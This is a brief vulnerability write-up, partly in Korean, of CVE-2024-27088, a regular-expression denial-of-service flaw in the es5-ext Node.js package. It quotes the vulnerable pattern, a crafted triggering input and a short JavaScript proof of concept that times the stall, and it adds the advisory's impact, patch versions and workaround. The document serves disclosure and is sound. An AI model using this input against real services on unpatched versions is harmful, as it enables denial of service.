# CVE-2024-27088



## 취약점 개요

- CVE-2024-27088

- Feb 26, 2024

- ReDoS in node.js package

- rebob 프로젝트의 일환

## 취약점 설명

[github advisories](https://github.com/medikoo/es5-ext/security/advisories/GHSA-4gmj-3p3h-gm8h)

```
/^\sfunction\s([\0-')-\uffff]+)\s(([\0-(-\uffff]))\s*{/
```

This vulnerability can be exploited when there is an imbalance in parentheses, which results in excessive backtracking and subsequently increases the CPU load and processing time significantly. This vulnerability can be triggered using the following input:

`'function{' + 'n'.repeat(31) + '){'`

Here is a simple PoC code to demonstrate the issue:

```
const protocolre = /^\sfunction\s([\0-')-\uffff]+)\s(([\0-(-\uffff]))\s*{/;

const startTime = Date.now();
const maliciousInput = 'function{' + 'n'.repeat(31) + '){'

protocolre.test(maliciousInput);

const endTime = Date.now();

console.log("process time: ", endTime - startTime, "ms");
```




**Impact**

Passing functions with very long names or complex default argument names into function#copy orfunction#toStringTokens may put script to stall

**Patches**
Fixed with 3551cdd and a52e957
Published with v0.10.63

**Workarounds**
No real workaround aside of refraining from using above utilities.

[issue](https://github.com/medikoo/es5-ext/issues/201)
[target package](https://www.npmjs.com/package/es5-ext)